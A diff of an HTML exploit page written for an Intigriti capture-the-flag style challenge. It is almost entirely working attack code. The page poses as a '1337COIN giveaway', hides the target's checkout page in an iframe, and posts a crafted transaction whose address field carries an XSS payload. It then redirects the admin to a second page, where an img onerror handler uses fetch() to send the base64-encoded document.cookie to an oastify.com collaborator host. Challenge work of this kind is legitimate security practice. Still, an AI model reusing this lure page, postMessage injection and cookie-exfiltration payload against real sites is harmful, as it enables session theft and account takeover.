@@ -1,36 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
-<head><title>Exploit</title></head>
-<body>
-    <h1 style="color:white">Processing Giveaway...</h1>
-    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" width="1" height="1" style="visibility:hidden"></iframe>
+<html>
+<head>
+    <title>Giveaway - Final Step</title>
+</head>
+<body style="background: #050A0E; color: #00FF88; font-family: sans-serif; text-align: center;">
+    <h1>Processing your 1337COIN reward...</h1>
+    <p>Please stay on this page for 10 seconds.</p>
+
+    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="display:none;"></iframe>
 
     <script>
-        // The XSS payload for MarketWatch.html
-        const XSS = '"><img src=x onerror="fetch(\'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com/?c=\'+btoa(document.cookie))">';
-        
+        // The XSS payload. It breaks out of the title attribute and sends the admin's secret flag/cookie to you.
+        const COLLAB = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';
+        const XSS = `"><img src=x onerror="fetch('${COLLAB}/?leak='+btoa(document.cookie))">`;
+
         window.onload = function() {
-            const frame = document.getElementById('target').contentWindow;
-            
-            // Step 2: Spam the transaction message for 5 seconds to ensure it hits
-            let count = 0;
-            const spammer = setInterval(() => {
-                frame.postMessage({
+            const victim = document.getElementById('target').contentWindow;
+
+            // Step 2: Strike after 4 seconds (allows wallets to load)
+            setTimeout(() => {
+                victim.postMessage({
                     type: 'submitTransaction',
                     transaction: {
                         currency: '1337COIN',
-                        amount: 1,
-                        toAddress: XSS 
+                        amount: 0.00001,
+                        toAddress: XSS // Our payload is now the "trail"
                     }
                 }, '*');
-                count++;
-                if (count > 20) clearInterval(spammer);
-            }, 500);
+                
+                console.log("Transaction submitted. Redirecting admin to trigger XSS...");
 
-            // Step 3: Wait for transaction to settle, then redirect the WHOLE page to MarketWatch
-            setTimeout(() => {
-                window.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
-            }, 6000);
+                // Step 3: Redirect the admin to MarketWatch to fire the XSS
+                setTimeout(() => {
+                    window.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
+                }, 2000);
+            }, 4000);
         };
     </script>
 </body>
